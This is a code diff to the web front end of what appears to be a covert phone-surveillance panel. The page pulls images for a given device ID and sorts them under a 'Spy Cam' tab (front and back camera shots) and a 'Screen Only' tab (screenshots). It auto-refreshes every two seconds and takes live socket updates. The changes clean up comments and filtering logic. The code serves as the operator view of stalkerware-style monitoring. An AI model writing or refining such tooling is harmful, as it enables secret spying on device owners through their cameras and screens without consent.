@@ -146,7 +146,7 @@
             <i class="fa-solid fa-eye"></i> Spy Cam
         </button>
         <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
-            <i class="fa-solid fa-mobile-screen"></i> Screen
+            <i class="fa-solid fa-mobile-screen"></i> Screen Only
         </button>
     </div>
 
@@ -206,13 +206,11 @@
                 alert("Device ID Missing!");
                 return;
             }
-            fetchFiles(true, false); // First load (Show spinner)
+            fetchFiles(true, false); // First load
             setupSocket();           // Live connection
 
-            // 🔥 AUTO REFRESH LOGIC (Every 2 Seconds)
+            // Auto Refresh
             setInterval(() => {
-                // Background refresh (isReset=true, isBackground=true)
-                // Spinner nahi dikhayega, bas data layega
                 fetchFiles(true, true);
             }, 2000); 
         };
@@ -221,37 +219,25 @@
         //  2. FETCH DATA & SORTING
         // ==========================================
         
-        // Updated Function to handle background refreshes
         function fetchFiles(isReset = false, isBackground = false) {
-            if (isLoading && !isBackground) return; // Wait if non-background load is active
+            if (isLoading && !isBackground) return; 
             
             isLoading = true;
-            
-            // Sirf tab spinner dikhao jab background refresh NA ho
-            if (!isBackground) {
-                loadingSpinner.style.display = 'block';
-            }
+            if (!isBackground) loadingSpinner.style.display = 'block';
 
             let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
-
-            // Note: Auto-refresh hamesha latest data (reset) lata hai
-            if (nextCursor && !isReset) {
-                url += `&next_cursor=${nextCursor}`;
-            }
+            if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    if (!isBackground) {
-                        loadingSpinner.style.display = 'none';
-                    }
+                    if (!isBackground) loadingSpinner.style.display = 'none';
                     isLoading = false;
 
                     let newFiles = data.photos || [];
                     
                     if (data.next_cursor) {
                         nextCursor = data.next_cursor;
-                        // Auto refresh me load more button ko hide mat karna agar already hai
                         if (!isBackground || loadMoreArea.style.display !== 'block') {
                              loadMoreArea.style.display = 'block';
                         }
@@ -260,22 +246,16 @@
                         loadMoreArea.style.display = 'none';
                     }
 
-                    // Compare current data with new data to avoid unnecessary DOM updates if same
                     const isDataDifferent = JSON.stringify(newFiles) !== JSON.stringify(allFilesData.slice(0, newFiles.length));
 
                     if (isReset) {
-                        // Agar data same hai background refresh me, toh redraw mat karo (flicker bachega)
-                        if (isBackground && !isDataDifferent) {
-                            return; 
-                        }
+                        if (isBackground && !isDataDifferent) return; 
                         allFilesData = newFiles; 
                     } else {
                         allFilesData = [...allFilesData, ...newFiles]; 
                     }
 
-                    // 🔥 SORTING LOGIC
                     sortFilesByTime();
-
                     renderGallery();
                 })
                 .catch(err => {
@@ -289,12 +269,11 @@
             if (nextCursor) fetchFiles(false, false);
         }
 
-        // 🔥 Helper Function to sort files by timestamp in URL
         function sortFilesByTime() {
             allFilesData.sort((a, b) => {
                 const timeA = extractTime(a);
                 const timeB = extractTime(b);
-                return timeB - timeA; // Descending (Newest First)
+                return timeB - timeA; 
             });
         }
 
@@ -309,7 +288,7 @@
         }
 
         // ==========================================
-        //  3. FILTER & RENDER
+        //  3. FILTER & RENDER (CORRECTED LOGIC)
         // ==========================================
         function switchTab(category) {
             currentFilter = category;
@@ -325,15 +304,18 @@
         function renderGallery() {
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
+                
+                // Exclude any 'gallery' path files first (Since Gallery page is separate)
+                if (lowerUrl.includes('gallery')) return false;
+
                 if (currentFilter === 'camera') {
+                    // TAB 1: Spy Camera
                     return lowerUrl.includes('front') || lowerUrl.includes('back') || lowerUrl.includes('cam');
                 } else {
+                    // TAB 2: Screen Capture Only (No Gallery)
                     return lowerUrl.includes('screen') || lowerUrl.includes('shot') || lowerUrl.includes('capture');
                 }
             });
-
-            // Save scroll position (Optional enhancement)
-            // const scrollPos = window.scrollY;
 
             galleryGrid.innerHTML = '';
 
@@ -351,8 +333,8 @@
 
                 let badgeText = "Image";
                 if(url.includes('front')) badgeText = "Front Cam";
-                if(url.includes('back')) badgeText = "Back Cam";
-                if(url.includes('screen')) badgeText = "Screen";
+                else if(url.includes('back')) badgeText = "Back Cam";
+                else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen";
 
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
@@ -363,7 +345,7 @@
         }
 
         // ==========================================
-        //  4. REAL-TIME UPDATES (Backups Socket)
+        //  4. REAL-TIME UPDATES
         // ==========================================
         function setupSocket() {
             socket.on('new-file', (data) => {
@@ -375,8 +357,11 @@
                         sortFilesByTime();
                     }
                     
-                    let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back') || (data.type === 'gallery');
-                    let isScreen = data.url.includes('screen') || data.url.includes('shot') || (data.type === 'screen');
+                    // Don't update if it's a gallery file
+                    if(data.url.includes('gallery') || data.type === 'gallery') return;
+
+                    let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back');
+                    let isScreen = data.url.includes('screen') || data.url.includes('shot');
 
                     if ((currentFilter === 'camera' && isCam) || (currentFilter === 'screen' && isScreen)) {
                         renderGallery(); 
